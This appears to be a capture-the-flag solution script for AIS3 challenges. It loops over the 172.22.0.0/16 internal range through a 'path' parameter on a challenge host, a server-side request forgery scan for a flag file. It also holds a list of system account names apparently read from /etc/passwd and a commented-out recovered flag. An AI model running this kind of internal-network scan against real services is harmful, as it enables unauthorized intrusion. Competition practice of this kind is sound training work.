import requests
import pickle
name=[
    'root',
    'daemon',
    'bin',
    'sys',
    'sync',    
    'games',
    'man',
    'lp', 
    'mail',    
    'news', 
    'uucp', 
    'proxy',
    'www-data',
    'backup',
    'Mailing List Manager',
    'irc',
    'Gnats Bug-Reporting System (admin)',
    'nobody',
    '_apt'
]
for i in range(0,256):
    for j in range(0,256):
        print(i,j)
        # url='https://squirrel.ais3.org/api.php?get=https://172.22.{}.{}'.format(i,j)
        url="https://shark.ais3.org/?path=http://172.22.{}.{}/flag".format(i,j)
        #    https://shark.ais3.org/?path=http://172.22.0.1
        r = requests.get(url)
        print(r.content)
        if 'AIS'  in str(r.content):
            break
        #AIS3{5h4rk5_d0n'7_5w1m_b4ckw4rd5}
# data="//flag"
# # data=pickle.dumps(data)
# if data and not data:
#     print('y')
# if data:
#     print('if data')
# if not data:
#     print('not data')
